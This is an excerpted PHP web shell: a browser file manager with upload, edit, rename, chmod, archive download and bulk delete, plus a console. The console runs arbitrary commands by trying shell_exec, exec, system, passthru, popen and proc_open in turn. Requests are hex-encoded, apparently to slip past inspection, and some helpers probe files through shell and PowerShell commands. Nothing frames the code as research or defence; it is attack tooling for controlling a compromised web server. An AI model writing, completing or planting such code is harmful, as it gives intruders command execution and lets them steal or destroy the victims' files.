...
function _run_cmd($cmd) {
    ...
    foreach ($_cmds as $fn) {
        ...
        if ($fn === 'shell_exec') {
            $output = @$fn($full);
            if ($output !== null) $success = true;
        } elseif ($fn === 'exec') {
            $out = array(); $ret = 0;
            @$fn($full, $out, $ret);
            if ($ret === 0 || !empty($out)) { $output = implode("\n", $out); $success = true; }
        } elseif ($fn === 'system' || $fn === 'passthru') {
            ob_start();
            $ret = @$fn($full);
            $output = ob_get_clean();
            if ($ret !== false || $output !== '') { $success = true; }
        } elseif ($fn === 'popen') {
            $h = @$fn($full, 'r');
            if ($h) {
                $output = @stream_get_contents($h);
                @pclose($h);
                if ($output !== false) $success = true;
            }
        } elseif ($fn === 'proc_open') {
...
function _dir_exists($path) {
    ...
    $cmd = (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? "if exist {$esc}\\ (echo 1)" : "test -d {$esc} && echo 1";
    $out = _run_cmd($cmd);
    return (trim($out) === '1');
}
...
function _get_file_info($path) {
    ...
    if ($isWin) {
        $testDir = _run_cmd("if exist {$esc}\\ (echo DIR)");
        if (trim($testDir) === 'DIR') {
            $info['is_dir'] = true;
            $info['size'] = 0;
        } else {
            $info['is_dir'] = false;
            $size = _run_cmd("for %I in ({$esc}) do @echo %~zI");
            if (is_numeric(trim($size))) $info['size'] = (int)trim($size);
        }
        $mtime = _run_cmd("powershell -Command \"(Get-Item {$esc}).LastWriteTime.ToFileTime()\"");
        if (is_numeric(trim($mtime))) $info['mtime'] = (int)(trim($mtime)/10000000 - 11644473600);
        $info['perms'] = '0755';
        $info['writable'] = true;
        return $info;
    } else {
        $testDir = _run_cmd("test -d {$esc} && echo 'DIR'");
        if (trim($testDir) === 'DIR') {
            $info['is_dir'] = true;
            $info['size'] = 0;
        } else {
            $info['is_dir'] = false;
            $size = _run_cmd("stat -c%s {$esc} 2>/dev/null");
            if (is_numeric(trim($size))) $info['size'] = (int)trim($size);
        }
        $mtime = _run_cmd("stat -c%Y {$esc} 2>/dev/null");
        if (is_numeric(trim($mtime))) $info['mtime'] = (int)trim($mtime);
        $perms = _run_cmd("stat -c%a {$esc} 2>/dev/null");
        if (is_numeric(trim($perms))) {
            $info['perms'] = str_pad(trim($perms), 4, '0', STR_PAD_LEFT);
            $info['writable'] = true;
        } else {
            $info['perms'] = '????';
            $info['writable'] = false;
    ...
    switch ($action) {
        case 'goto':
            ...
            if ($targetDir !== false) {
                ...
                if ($targetDir === '') {
                    $targetDir = (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') ? 'C:\\' : '/';
                }
...
if (!is_array($directoryContents)) {
    $directoryContents = _list_dir($currentDirectory);
...
foreach ($directoryContents as $item) {
    ...
    if (($fileSize === false || $fileModTime === false || $filePerms === false || $filePerms === '0000') && $commandAvailable) {
        $info = _get_file_info($itemPath);
        if ($info !== false) {
            if (!$isDirectory && $fileSize === false) $fileSize = $info['size'];
            if ($fileModTime === false) $fileModTime = $info['mtime'];
            if ($filePerms === false || $filePerms === '0000') $filePerms = $info['perms'];
            $canWrite = $info['writable'];
        }
    }
...
<div style="margin-top:12px;"><button type="button" class="btn btn-primary" onclick="doUploadFileHex(this)">Upload</button><span id="upload_status" class="file-meta" style="margin-left:12px;"></span></div>
</div></div>
<div class="card" style="margin-bottom:0;"><div class="card-header"><span class="card-title">Create</span></div>
<div class="card-body">
<form onsubmit="doCreateItemHex(event, 'file')" class="input-group"><input type="text" name="mk_file" placeholder="File name..." style="flex:1;"><button type="submit" class="btn btn-success">File</button></form>
<form onsubmit="doCreateItemHex(event, 'folder')" class="input-group" style="margin-top:12px;"><input type="text" name="mk_folder" placeholder="Folder name..." style="flex:1;"><button type="submit" class="btn btn-success">Folder</button></form>
</div></div>
</div>
...
<!-- Editor -->
<div class="card" id="editorCard" style="display:none;"><div class="card-header"><span class="card-title">Editing: <span id="editTitleName"></span></span></div><div class="card-body"><form onsubmit="doSaveEditHex(event)"><input type="hidden" id="editFileName"><textarea id="editContentArea" style="min-height:400px;"></textarea><div style="margin-top:16px;display:flex;gap:8px;"><button type="submit" class="btn btn-primary">Save Changes</button><button type="button" class="btn btn-ghost" onclick="document.getElementById('editorCard').style.display='none';">Cancel</button></div></form></div></div>

<!-- Console -->
<?php if ($commandAvailable): ?>
<div class="card"><div class="card-header"><span class="card-title">Console</span></div>
<div class="card-body"><form id="consoleForm" onsubmit="submitConsoleHex(event)" class="input-group"><input type="text" id="exec_cmd_input" placeholder="Enter command..." style="flex:1;"><button type="submit" class="btn btn-primary">Execute</button></form><div id="consoleResultOutput" class="console" style="margin-top:16px;display:none;"></div></div></div>
<?php endif; ?>

<!-- Bulk actions -->
<div class="bulk-bar" id="bulk-actions"><span class="bulk-count" id="selected-count">0 selected</span><button type="button" class="btn btn-ghost" onclick="doBulkDownloadHex()">Download Archive</button><button type="button" class="btn btn-danger" onclick="doBulkDeleteHex()">Delete Selected</button></div>

<!-- File table -->
<div class="card"><div class="card-header"><span class="card-title">Directory</span><button type="button" class="btn btn-ghost btn-sm" onclick="sendHexPayload({action:'goto', goto_hex:stringToHex('<?= addslashes(dirname($currentDirectory)) ?>')}).then(()=>location.reload());">Parent</button></div>
...
<td><div id="row-normal-<?= $name ?>" class="file-name-cell"><div class="file-icon"><?= $iconHtml ?></div><?php if ($isDirectory): ?><a href="#" class="file-name" onclick="sendHexPayload({action:'goto', goto_hex:stringToHex('<?= addslashes($fullPath) ?>')}).then(()=>location.reload()); return false;"><?= $name ?></a><?php else: ?><a href="#" class="file-name" onclick="openViewerHex('<?= addslashes($item['name']) ?>'); return false;"><?= $name ?></a><?php endif; ?></div><div id="row-rename-<?= $name ?>" style="display:none;gap:8px;align-items:center;"><input type="text" id="rename_input_<?= $name ?>" value="<?= $name ?>" style="flex:1;"><button type="button" class="btn btn-primary btn-sm" onclick="doRenameHex('<?= addslashes($item['name']) ?>')">Save</button><button type="button" class="btn btn-ghost btn-sm" onclick="cancelRenameInput('<?= addslashes($item['name']) ?>')">Cancel</button></div></td>
...
<td><div class="actions"><?php if (!$isDirectory): ?><button type="button" class="btn btn-ghost btn-sm" onclick="openEditorHex('<?= addslashes($item['name']) ?>')">Edit</button><?php endif; ?><button type="button" class="btn btn-ghost btn-sm" onclick="openRenameInput('<?= addslashes($item['name']) ?>')">Rename</button><button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= $name ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button><button type="button" class="btn btn-ghost btn-sm" onclick="doDownloadHex('<?= addslashes($item['name']) ?>')">DL</button><button type="button" class="btn btn-danger btn-sm" onclick="doDeleteHex('<?= addslashes($item['name']) ?>')">Del</button></div></td></tr>
<?php endforeach; ?>
</tbody></table></div></div>
</div>
